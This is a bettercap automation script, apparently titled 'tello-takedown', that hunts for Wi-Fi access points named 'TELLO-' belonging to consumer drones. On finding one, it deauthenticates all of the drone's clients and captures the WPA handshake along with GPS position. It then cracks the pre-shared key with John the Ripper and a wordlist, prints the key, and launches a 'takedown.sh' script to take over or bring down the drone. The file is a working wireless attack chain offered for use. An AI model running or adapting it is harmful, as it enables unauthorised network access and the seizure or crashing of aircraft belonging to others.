require("config");

var target; // Target ap (drone) bssid
var hostname;

log('📝 Script tello-takedown started');

log('📝 Turning on wifi recon');
run('wifi.recon on');
//run('!sleep 2')

/*log('📝 Setting up ticker');
run('set wifi.show.sort clients desc');
run('set wifi.show.limit 20')
run('set ticker.commands "clear; wifi.show"');
run('ticker on');*/

// Polyfill for "startsWith" String function
if (!String.prototype.startsWith) {
    Object.defineProperty(String.prototype, 'startsWith', {
        value: function(search, rawPos) {
            var pos = rawPos > 0 ? rawPos|0 : 0;
            return this.substring(pos, pos + search.length) === search;
        }
    });
}

// Polyfill for "includes" String function
if (!String.prototype.includes) {
  String.prototype.includes = function(search, start) {
    'use strict';

    if (search instanceof RegExp) {
      throw TypeError('first argument must not be a RegExp');
    }
    if (start === undefined) { start = 0; }
    return this.indexOf(search, start) !== -1;
  };
}

onEvent('mod.started', function(event){
    if(event.data == 'wifi'){
        run('wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11'); // Only scan 2,4 GHz channels
        log('📝 Turning off event stream');
        run('events.stream off');
    }
});

onEvent('wifi.ap.new', function(event){
    var ap = event.data;
    log('📡 Access point detected: ' + ap.hostname + ' @ ' + ap.mac + ' (' + ap.vendor + ')');
    //debug('JSON object: ' + JSON.stringify(ap));

    if(ap.hostname.startsWith('TELLO-')){
        log('🚁 Drone identified, homing in on channel ' + ap.channel);
        run('wifi.recon.channel ' + ap.channel);
        
        hostname = ap.hostname;
        target = ap.mac;
        log('🎯 Locked onto target: ' + hostname + ' (' + target + ')');

        log('💀 Deauthing all clients, stand by...')
        // TODO: https://github.com/bettercap/bettercap/issues/375 - deauth all clients except our own
        run('wifi.deauth ' + target);
    }
});

onEvent('wifi.client.handshake', function(event){
    var data = event.data;
    var gps = session.GPS; // session is a global object with all the session data
    var what = 'handshake';

    if(data.pmkid != null) {
        what = "RSN PMKID";
    } else if(data.full) {
        what += " (full)";
    } else if(data.half) {
        what += " (half)";
    }

    log('💰 Captured ' + what + ':');
    log('   station: ' + data.station);
    log('   ap: ' + data.ap);
    log('   lat:' + gps.Latitude + ' lon:' + gps.Longitude + ' updated_at:' + gps.Updated.String());

    if(data.full & target == data.ap) { //TODO: check this
        log('🤝 Target handshake data aquired, stopping wifi recon');
        run('wifi.recon off'); // Stop wifi recon 

        var cmd;

        //TODO: filter on ap mac address, if possible
        //log('🪄 Converting packets to hashcat 22000 format');
        //cmd = hcxpcapngtool + ' -o ' + hashcatFormat22000FileName + ' ' + handshakesFileName;
        log('🪄 Converting packets to JtR wpapsk format');
        cmd = hcxpcapngtool + ' --john ' + johnWPApskFileName + ' ' + handshakesFileName + ' &> /dev/null'; //TODO: Add &> /dev/null?
        log('   Command: ' + cmd);
        run('!'+cmd);

        //log('Sleeping...');
        //run('!sleep 10');

        log('🪅 Cracking hashes, stand by...');
        //cmd = 'cd ' + hashcatHomePath + ' && ' + hashcat + ' -m 22000 -a 0' +
        //    ' -o ' + hashcatOutputFileName + ' ' + hashcatFormat22000FileName + ' ' +  wordlistFileName;
        cmd = john + ' ' + johnWPApskFileName + ' --format=wpapsk --wordlist=' + wordlistFileName + ' &> /dev/null';
        log('   Command: ' + cmd);
        run('!'+cmd);

        //TODO: Monitor output file?
        log('🔑 Found Pre-Shared Key (PSK):');
        cmd = john + ' ' + johnWPApskFileName + ' --show | head -1 | cut -d : -f 2';
        run('!'+cmd);

        log('💎 Taking down 🚁 and executing golang code');
        cmd = 'sh takedown.sh ' + hostname + ' ' + johnWPApskFileName;
        run('!'+cmd);
    }
});
